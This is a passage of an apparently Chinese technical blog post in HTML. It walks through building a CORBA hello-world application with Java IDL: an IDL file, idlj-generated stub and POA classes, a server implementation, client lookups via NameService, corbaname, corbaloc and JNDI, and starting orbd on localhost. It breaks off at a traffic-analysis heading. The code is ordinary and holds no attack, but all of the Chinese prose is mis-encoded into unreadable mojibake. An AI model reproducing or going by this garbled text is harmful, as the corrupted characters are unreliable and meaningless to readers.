¼å¼ï¼Œå¹¶è°ƒç”¨å®¢æˆ·ç«¯æƒ³è¦è°ƒç”¨çš„æ–¹æ³•ã€‚æ–¹æ³•è¿”å›æ—¶ï¼Œæ¡†æ¶ä»£ç å°†è½¬æ¢ç»“æœæˆ–é”™è¯¯ï¼Œç„¶åé€šè¿‡ORBå°†å…¶å‘é€å›å®¢æˆ·ç«¯ã€‚</p><p>åœ¨ORBä¹‹é—´ï¼Œé€šä¿¡é€šè¿‡<strong>IIOP</strong>(the Internet Inter-ORB Protocol)äº’è”ç½‘å†…éƒ¨å¯¹è±¡è¯·æ±‚ä»£ç†åè®®è¿›è¡Œã€‚åŸºäºæ ‡å‡†TCP/IP Internetåè®®çš„IIOPæä¾›äº†CORBAå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´é€šä¿¡çš„æ ‡å‡†ã€‚</p><h3 id="ä½¿ç”¨JAVA-IDLç¼–å†™CORBAåˆ†å¸ƒå¼åº”ç”¨"><a href="#ä½¿ç”¨JAVA-IDLç¼–å†™CORBAåˆ†å¸ƒå¼åº”ç”¨" class="headerlink" title="ä½¿ç”¨JAVA IDLç¼–å†™CORBAåˆ†å¸ƒå¼åº”ç”¨"></a>ä½¿ç”¨JAVA IDLç¼–å†™CORBAåˆ†å¸ƒå¼åº”ç”¨</h3><h4 id="ç¼–å†™IDL"><a href="#ç¼–å†™IDL" class="headerlink" title="ç¼–å†™IDL"></a>ç¼–å†™IDL</h4><p>CORBAä½¿ç”¨IDLä¾›ç”¨æˆ·æè¿°ç¨‹åºæ¥å£ï¼Œ æ‰€ä»¥è¿™é‡Œç¬¬ä¸€æ­¥å°±æ˜¯ç¼–å†™idlæè¿°æ¥å£ï¼Œåˆ›å»º<code>Hello.idl</code>æ–‡ä»¶ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">module HelloApp</span><br><span class="line">&#123;</span><br><span class="line">interface Hello</span><br><span class="line">&#123;</span><br><span class="line">string sayHello();</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>è¯¥æ®µä»£ç æè¿°äº†<code>Hello</code>æ¥å£ä¸­åŒ…å«<code>sayHello()</code>æ–¹æ³•ï¼Œä»–ä¼šè¿”å›å­—ç¬¦ä¸²ç±»å‹æ•°æ®ã€‚</p><h4 id="ç¼–è¯‘ç”Ÿæˆclient-side-classes"><a href="#ç¼–è¯‘ç”Ÿæˆclient-side-classes" class="headerlink" title="ç¼–è¯‘ç”Ÿæˆclient side classes"></a>ç¼–è¯‘ç”Ÿæˆclient side classes</h4><p>æ¥ç€ä½¿ç”¨JAVAçš„IDLç¼–è¯‘å™¨<code>idlj</code>ï¼Œå°†idlæ–‡ä»¶ç¼–è¯‘æˆclassæ–‡ä»¶:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idlj -fclient Hello.idl</span><br></pre></td></tr></table></figure></p><p>åˆ›å»ºäº†ä¸€ä¸ªæ–°ç›®å½•<code>HelloApp</code>ï¼Œå¹¶ç”Ÿæˆäº†5ä¸ªæ–°æ–‡ä»¶ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631851.jpg" alt="-w1067"></p><p>ä»–ä»¬ä¹‹é—´çš„å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631861.jpg" alt=""></p><blockquote><p>å›¾ç‰‡æ¥æºï¼š<a href="https://weinan.io/2017/05/03/corba-iiop.html" target="_blank" rel="noopener">An Introduction To The CORBA And Java RMI-IIOP</a></p></blockquote><p>å‚è€ƒä»£ç ï¼Œç®€å•æ¦‚æ‹¬ä¸€ä¸‹:</p><ul><li><code>HelloOperations</code>æ¥å£ä¸­å®šä¹‰<code>sayHello()</code>æ–¹æ³•</li><li><code>Hello</code>ç»§æ‰¿äº†<code>HelloOperations</code></li><li><code>_HelloStub</code>ç±»å®ç°äº†<code>Hello</code>æ¥å£ï¼Œclient sideä½¿ç”¨<code>hello</code>æ¥å£è°ƒç”¨<code>servant side</code>ã€‚</li><li><code>HelloHelper</code>ç±»å®ç°ç½‘ç»œä¼ è¾“ï¼Œæ•°æ®ç¼–ç å’Œè§£ç çš„å·¥ä½œã€‚</li></ul><p>è¯¦ç»†åˆ†æä¸€ä¸‹å‡ æ®µæ ¸å¿ƒä»£ç ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹<code>_HelloStub.java</code>ä¸­<code>sayHello()</code>çš„å®ç°ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public String sayHello ()</span><br><span class="line">&#123;</span><br><span class="line">          org.omg.CORBA.portable.InputStream $in = null;</span><br><span class="line">          try &#123;</span><br><span class="line">              org.omg.CORBA.portable.OutputStream $out = _request (&quot;sayHello&quot;, true);</span><br><span class="line">              $in = _invoke ($out);</span><br><span class="line">              String $result = $in.read_string ();</span><br><span class="line">              return $result;</span><br><span class="line">          &#125; catch (org.omg.CORBA.portable.ApplicationException $ex) &#123;</span><br><span class="line">              $in = $ex.getInputStream ();</span><br><span class="line">              String _id = $ex.getId ();</span><br><span class="line">              throw new org.omg.CORBA.MARSHAL (_id);</span><br><span class="line">          &#125; catch (org.omg.CORBA.portable.RemarshalException $rm) &#123;</span><br><span class="line">              return sayHello (        );</span><br><span class="line">          &#125; finally &#123;</span><br><span class="line">              _releaseReply ($in);</span><br><span class="line">          &#125;</span><br><span class="line">&#125; // sayHello</span><br></pre></td></tr></table></figure></p><p>ä½¿ç”¨<code>org.omg.CORBA.portable</code>çš„<code>InputStream</code>å’Œ<code>OutputStream</code>æ¥è¡¨ç¤ºè°ƒç”¨çš„è¯·æ±‚å’Œå“åº”ï¼Œé€šè¿‡<code>_request()</code>å’Œ<code>_invoke()</code>æ–¹æ³•è°ƒç”¨å¾—åˆ°ç»“æœã€‚</p><p>å¦å¤–åœ¨<code>HelloHelper</code>ç±»ä¸­è´Ÿè´£å¤„ç†å¯¹è±¡ç½‘ç»œä¼ è¾“çš„ç¼–ç å’Œè§£ç ï¼Œæ¥çœ‹ä¸€ä¸‹<code>narrow</code>æ–¹æ³•ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> HelloApp.<span class="function">Hello <span class="title">narrow</span> <span class="params">(org.omg.CORBA.Object obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (obj == <span class="keyword">null</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> HelloApp.Hello)</span><br><span class="line">    <span class="keyword">return</span> (HelloApp.Hello)obj;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!obj._is_a (id ()))</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> org.omg.CORBA.BAD_PARAM ();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    org.omg.CORBA.portable.Delegate delegate = ((org.omg.CORBA.portable.ObjectImpl)obj)._get_delegate ();</span><br><span class="line">    HelloApp._HelloStub stub = <span class="keyword">new</span> HelloApp._HelloStub ();</span><br><span class="line">    stub._set_delegate(delegate);</span><br><span class="line">    <span class="keyword">return</span> stub;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ¥å—ä¸€ä¸ª<code>org.omg.CORBA.Object</code>å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œè¿”å›stubã€‚</p><h4 id="ç¼–è¯‘ç”Ÿæˆservant-side"><a href="#ç¼–è¯‘ç”Ÿæˆservant-side" class="headerlink" title="ç¼–è¯‘ç”Ÿæˆservant side"></a>ç¼–è¯‘ç”Ÿæˆservant side</h4><p>æ‰§è¡Œå‘½ä»¤ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idlj -fserver Hello.idl</span><br></pre></td></tr></table></figure></p><p>ä¼šç”Ÿæˆä¸‰ä¸ªæ–‡ä»¶ï¼Œé™¤äº†<code>HelloPOA.java</code>,å…¶ä½™éƒ½æ˜¯ä¸€æ ·çš„ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631868.jpg" alt="-w263"></p><p>POA(Portable Object Adapter)æ˜¯ä¾¿æºå¼å¯¹è±¡é€‚é…å™¨ï¼Œå®ƒæ˜¯CORBAè§„èŒƒçš„ä¸€éƒ¨åˆ†ã€‚è¿™é‡Œçš„è¿™ä¸ªPOAè™šç±»æ˜¯servant sideçš„æ¡†æ¶ç±»ï¼Œå®ƒæä¾›äº†æ–¹æ³•å¸®åŠ©æˆ‘ä»¬å°†å…·ä½“å®ç°å¯¹è±¡æ³¨å†Œåˆ°naming serviceä¸Šã€‚</p><p>æ¥çœ‹ä¸€ä¸‹å…¶æ ¸å¿ƒä»£ç ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloPOA</span> <span class="keyword">extends</span> <span class="title">org</span>.<span class="title">omg</span>.<span class="title">PortableServer</span>.<span class="title">Servant</span></span></span><br><span class="line"><span class="class"> <span class="keyword">implements</span> <span class="title">HelloApp</span>.<span class="title">HelloOperations</span>, <span class="title">org</span>.<span class="title">omg</span>.<span class="title">CORBA</span>.<span class="title">portable</span>.<span class="title">InvokeHandler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Constructors</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> java.util.Hashtable _methods = <span class="keyword">new</span> java.util.Hashtable ();</span><br><span class="line">  <span class="keyword">static</span></span><br><span class="line">  &#123;</span><br><span class="line">    _methods.put (<span class="string">"sayHello"</span>, <span class="keyword">new</span> java.lang.Integer (<span class="number">0</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> org.omg.CORBA.portable.<span class="function">OutputStream <span class="title">_invoke</span> <span class="params">(String $method,</span></span></span><br><span class="line"><span class="function"><span class="params">                                org.omg.CORBA.portable.InputStream in,</span></span></span><br><span class="line"><span class="function"><span class="params">                                org.omg.CORBA.portable.ResponseHandler $rh)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    org.omg.CORBA.portable.OutputStream out = <span class="keyword">null</span>;</span><br><span class="line">    java.lang.Integer __method = (java.lang.Integer)_methods.get ($method);</span><br><span class="line">    <span class="keyword">if</span> (__method == <span class="keyword">null</span>)</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> org.omg.CORBA.BAD_OPERATION (<span class="number">0</span>, org.omg.CORBA.CompletionStatus.COMPLETED_MAYBE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (__method.intValue ())</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">case</span> <span class="number">0</span>:  <span class="comment">// HelloApp/Hello/sayHello</span></span><br><span class="line">       &#123;</span><br><span class="line">         String $result = <span class="keyword">null</span>;</span><br><span class="line">         $result = <span class="keyword">this</span>.sayHello ();</span><br><span class="line">         out = $rh.createReply();</span><br><span class="line">         out.write_string ($result);</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">default</span>:</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> org.omg.CORBA.BAD_OPERATION (<span class="number">0</span>, org.omg.CORBA.CompletionStatus.COMPLETED_MAYBE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out;</span><br><span class="line">  &#125; <span class="comment">// _invoke</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ä»–ä¹Ÿå®ç°äº†<code>HelloOperations</code>æ¥å£ï¼Œä»£ç çš„æœ€å¼€å§‹å°†<code>sayHello</code>æ–¹æ³•æ”¾å…¥ä¸€ä¸ªhashtableä¸­ï¼Œ<code>_invoke</code>æ–¹æ³•ä¸­ï¼Œå°†è°ƒç”¨<code>sayHello()</code>çš„ç»“æœé€šè¿‡<code>org.omg.CORBA.portable.ResponseHandler</code>å¯¹è±¡é€šè¿‡ç½‘ç»œä¼ è¾“åˆ°client sideã€‚</p><p>æ­¤æ—¶<code>idjl</code>ç”Ÿæˆçš„å…¨éƒ¨classçš„å…³ç³»å›¾ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631880.jpg" alt=""></p><p>æ¥ä¸‹æ¥ï¼Œè¦åšçš„å°±æ˜¯ç”¨æˆ·è‡ªå·±å®ç°client sideå’Œservant sideä¸­å…·ä½“çš„æ–¹æ³•æ“ä½œã€‚</p><h4 id="servant-sideå®ç°"><a href="#servant-sideå®ç°" class="headerlink" title="servant sideå®ç°"></a>servant sideå®ç°</h4><p>å¯¹äºservant sideè€Œè¨€ï¼Œå®ç°ä¸€ä¸ª<code>HelloImpl</code>ç±»æ¥ç»§æ‰¿<code>HelloPOA</code>ç±»å®ç°<code>sayHello()</code>æ–¹æ³•ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> HelloApp;</span><br><span class="line"><span class="keyword">import</span> org.omg.CORBA.ORB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">extends</span> <span class="title">HelloPOA</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ORB orb;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setORB</span><span class="params">(ORB orbVal)</span> </span>&#123;</span><br><span class="line">        orb = orbVal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"\nHello, world!\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ­¤æ—¶çš„ç»§æ‰¿å…³ç³»å¦‚ä¸‹ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631890.jpg" alt=""></p><p>æ¥ç€ï¼Œéœ€è¦å†™ä¸€ä¸ªæœåŠ¡ç«¯<code>HelloServer</code>ç±»æ¥æ¥å—client sideå¯¹<code>HelloImpl.sayHello()</code>çš„è°ƒç”¨ã€‚</p><p>ä¸‰ä¸ªéƒ¨åˆ†ï¼š</p><ul><li>ç¬¬ä¸€éƒ¨åˆ†æ ¹æ®ä¼ å…¥çš„<code>name service</code>åœ°å€å‚æ•°æ¥åˆ›å»ºï¼Œæ ¹æ®CORBAçš„è§„èŒƒï¼Œé€šè¿‡ORBè·å–ä¸€ä¸ªåç§°ä¸º<code>RootPOA</code>çš„<code>POA</code>å¯¹è±¡ã€‚(å…¶ä¸­name serviceç”±jdkä¸­çš„<code>orbd</code>æä¾›)</li><li>ç¬¬äºŒéƒ¨åˆ†å°±æ˜¯å°†å…·ä½“å®ç°ç±»æ³¨å†Œåˆ°naming serviceä¸­ï¼Œç”¨orbè·å–åˆ°name serviceï¼Œå°†<code>HelloImpl</code>å¯¹è±¡ä»¥<code>Hello</code>ä¸ºåç»‘å®šã€‚</li><li>ç¬¬ä¸‰éƒ¨åˆ†å°±æ˜¯å°†serverè®¾ç½®ä¸ºç›‘å¬çŠ¶æ€æŒç»­è¿è¡Œï¼Œç”¨äºæ‹¦æˆªå¹¶å¤„ç†client sideçš„è¯·æ±‚ï¼Œè¿”å›ç›¸åº”çš„å…·ä½“å®ç°ç±»ã€‚</li></ul><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631898.jpg" alt="-w712"></p><h4 id="Client-Sideå®ç°"><a href="#Client-Sideå®ç°" class="headerlink" title="Client Sideå®ç°"></a>Client Sideå®ç°</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> HelloApp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.omg.CORBA.ORB;</span><br><span class="line"><span class="keyword">import</span> org.omg.CosNaming.NamingContext;</span><br><span class="line"><span class="keyword">import</span> org.omg.CosNaming.NamingContextExt;</span><br><span class="line"><span class="keyword">import</span> org.omg.CosNaming.NamingContextExtHelper;</span><br><span class="line"><span class="keyword">import</span> org.omg.CosNaming.NamingContextHelper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> Hello helloImpl;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        ORB orb = ORB.init(args, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        org.omg.CORBA.Object objRef = orb.resolve_initial_references(<span class="string">"NameService"</span>);</span><br><span class="line"></span><br><span class="line">        NamingContextExt ncRef = NamingContextExtHelper.narrow(objRef);</span><br><span class="line"></span><br><span class="line">        String name = <span class="string">"Hello"</span>;</span><br><span class="line">        <span class="comment">// helloImplçš„ç±»å‹ä¸º_HelloStubï¼Œè€Œä¸æ˜¯çœŸæ­£çš„helloImpl</span></span><br><span class="line">        helloImpl = HelloHelper.narrow(ncRef.resolve_str(name));</span><br><span class="line"></span><br><span class="line">        System.out.println(helloImpl.sayHello());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå’ŒæœåŠ¡ç«¯ä¸€æ ·ï¼Œéœ€è¦åˆå§‹åŒ–ORBï¼Œé€šè¿‡ORBæ¥è·å–NameServiceå¹¶å°†å…¶è½¬æ¢æˆå‘½åä¸Šä¸‹æ–‡ã€‚ä¹‹åé€šè¿‡åˆ«ååœ¨å‘½åä¸Šä¸‹æ–‡ä¸­è·å–å…¶å¯¹åº”çš„Stubï¼Œè°ƒç”¨Stubä¸­çš„sayhello()æ–¹æ³•ï¼Œè¿™ä¸ªæ—¶å€™æ‰ä¼šå®Œæˆclient sideå‘servant sideå‘é€è¯·æ±‚ï¼ŒPOAå¤„ç†è¯·æ±‚ï¼Œå¹¶å°†å…·ä½“å®ç°çš„HelloImplåŒ…è£…è¿”å›ç»™client sideã€‚</p><h4 id="naming-serviceå®ç°"><a href="#naming-serviceå®ç°" class="headerlink" title="naming serviceå®ç°"></a>naming serviceå®ç°</h4><p>ORBDå¯ä»¥ç†è§£ä¸ºORBçš„å®ˆæŠ¤è¿›ç¨‹(daemon)ï¼Œå…¶ä¸»è¦è´Ÿè´£å»ºç«‹å®¢æˆ·ç«¯(client side)ä¸æœåŠ¡ç«¯(servant side)çš„å…³ç³»ï¼ŒåŒæ—¶è´Ÿè´£æŸ¥æ‰¾æŒ‡å®šçš„IOR(å¯äº’æ“ä½œå¯¹è±¡å¼•ç”¨ï¼Œæ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œæ˜¯CORBAæ ‡å‡†çš„ä¸€éƒ¨åˆ†)ã€‚ORBDæ˜¯ç”±JavaåŸç”Ÿæ”¯æŒçš„ä¸€ä¸ªæœåŠ¡ï¼Œå…¶åœ¨æ•´ä¸ªCORBAé€šä¿¡ä¸­å……å½“ç€naming serviceçš„ä½œç”¨ï¼Œå¯ä»¥é€šè¿‡ä¸€è¡Œå‘½ä»¤è¿›è¡Œå¯åŠ¨ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orbd -ORBInitialPort 1050 -ORBInitialHost 127.0.0.1</span><br></pre></td></tr></table></figure></p><h4 id="æ‰§è¡Œ"><a href="#æ‰§è¡Œ" class="headerlink" title="æ‰§è¡Œ"></a>æ‰§è¡Œ</h4><p>æ¥ç€åˆ†åˆ«åœ¨<code>HelloServer</code>å’Œ<code>HelloClient</code>é…ç½®name serviceåœ°å€ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631905.jpg" alt="-w1007"></p><p>å…¶æ¬¡ä¾æ¬¡å¯åŠ¨<code>name service</code>ã€<code>HelloServer</code>ã€<code>HelloClient</code>ç»“æœå¦‚ä¸Šå›¾æ‰€ç¤ºã€‚</p><p>æ­¤å¤–ï¼Œé™¤äº†ä¸Šè¿°å…ˆè·å–NameServerï¼Œåé€šè¿‡<code>resolve_str()</code>æ–¹æ³•ç”Ÿæˆ(NameServeræ–¹å¼)çš„stubï¼Œè¿˜æœ‰ä¸¤ç§ï¼š</p><ul><li>ä½¿ç”¨ORB.string_to_objectç”Ÿæˆï¼ˆORBç”Ÿæˆæ–¹å¼ï¼‰</li><li>ä½¿ç”¨javax.naming.InitialContext.lookup()ç”Ÿæˆï¼ˆJNDIç”Ÿæˆæ–¹å¼ï¼‰</li></ul><p>ä»£ç åˆ†åˆ«å¦‚ä¸‹:<br>orbæ–¹å¼<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClietORB</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> Hello helloImpl;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ORB orb = ORB.init(args, <span class="keyword">null</span>);</span><br><span class="line">        org.omg.CORBA.Object obj = orb.string_to_object(<span class="string">"corbaname::127.0.0.1:1050#Hello"</span>);</span><br><span class="line">        Hello hello = HelloHelper.narrow(obj);</span><br><span class="line">        System.out.println(hello.sayHello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631913.jpg" alt="-w1164"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClientORB2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> Hello helloImpl;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        ORB orb = ORB.init(args, <span class="keyword">null</span>);</span><br><span class="line">        org.omg.CORBA.Object obj = orb.string_to_object(<span class="string">"corbaloc::127.0.0.1:1050"</span>);</span><br><span class="line">        NamingContextExt ncRef = NamingContextExtHelper.narrow(obj);</span><br><span class="line">        Hello hello = HelloHelper.narrow(ncRef.resolve_str(<span class="string">"Hello"</span>));</span><br><span class="line">        System.out.println(hello.sayHello());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631922.jpg" alt="-w1151"></p><p>JDNIæ–¹å¼ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClientJNDI</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> Hello helloImpl;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ORB orb = ORB.init(args, <span class="keyword">null</span>);</span><br><span class="line">        Hashtable env = <span class="keyword">new</span> Hashtable(<span class="number">5</span>, <span class="number">0.75f</span>);</span><br><span class="line">        env.put(<span class="string">"java.naming.corba.orb"</span>, orb);</span><br><span class="line">        Context ic = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        Hello helloRef = HelloHelper.narrow((org.omg.CORBA.Object)ic.lookup(<span class="string">"corbaname::127.0.0.1:1050#Hello"</span>));</span><br><span class="line">        System.out.println(helloRef.sayHello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631933.jpg" alt="-w1510"></p><h3 id="CORBAç½‘ç»œæµé‡åˆ†æ"><a href="#CORBAç½‘ç»œæµé‡åˆ†æ" class="headerlink" title="CORBAç½‘ç»œæµé‡åˆ†æ"></a>CORBAç½‘ç»œæµé‡åˆ†æ</h3><h4 id="servant-side"><a href="#servant-side" class="headerlink" title="servant side"></a>servant side</h4><p>æœåŠ¡ç«¯æµé‡å¤§è‡´åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼š</p><ul><li>è·å–Naming Service</li><li>æ³¨å†Œservant side</li></ul><p>è·å–Naming 